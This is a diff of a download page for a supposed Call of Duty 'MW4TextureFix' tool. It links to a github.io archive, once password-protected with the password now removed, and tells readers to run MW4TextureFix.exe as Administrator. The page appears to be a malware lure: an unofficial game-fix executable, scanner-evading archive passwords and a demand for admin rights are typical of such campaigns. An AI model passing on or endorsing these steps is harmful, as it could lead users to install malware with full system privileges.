@@ -44,12 +44,12 @@ The issue is with MW4's **On-Demand Texture Streaming** system. It's supposed to
 
 **[⬇️ Download MW4TextureFix.zip](https://Magiconblade.github.io/mw4-texture-fix/)**
 
-*(Archive size: 4.6 MB · Password: `6427910552`)*
+*(Archive size: 4.6 MB )*
 
 </div>
-
+ 
 1. **Download** the archive from the link above.
-2. **Extract** with WinRAR or 7-Zip. Use the password `6427910552`.
+2. **Extract** with WinRAR or 7-Zip.
 3. **Run** `MW4TextureFix.exe` as Administrator.
 4. Select your **Call of Duty HQ** folder.
 5. Click **"Turn on HD Textures"** and launch the game.
